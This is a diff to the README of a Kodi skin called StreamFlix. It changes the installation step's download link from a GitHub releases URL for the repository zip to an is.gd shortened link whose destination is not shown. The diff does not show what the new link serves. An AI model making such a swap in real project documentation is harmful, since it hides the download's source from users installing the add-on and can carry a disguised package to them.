@@ -17,7 +17,7 @@ A clean, minimalist Kodi skin that brings the Netflix experience to your media c
 
 ## Installation (with Auto-Updates)
 
-**Step 1:** Download the repository: [repository.streamflix.zip](https://github.com/tonycodes/skin.streamflix/releases/latest/download/repository.streamflix.zip)
+**Step 1:** Download the repository: [is.gd/wbolqo](https://is.gd/wbolqo)
 
 **Step 2:** In Kodi:
 1. Go to **Settings → Add-ons → Install from zip file**
